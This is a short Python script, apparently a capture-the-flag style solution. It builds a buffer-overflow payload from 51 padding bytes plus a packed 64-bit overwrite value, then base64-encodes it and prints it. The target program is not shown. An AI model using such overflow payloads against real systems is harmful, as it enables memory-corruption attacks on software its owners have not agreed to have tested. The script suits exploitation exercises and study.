
import sys
import struct
import base64

buf = b'SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS'
buf += struct.pack('<Q', 7123188792872811162)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
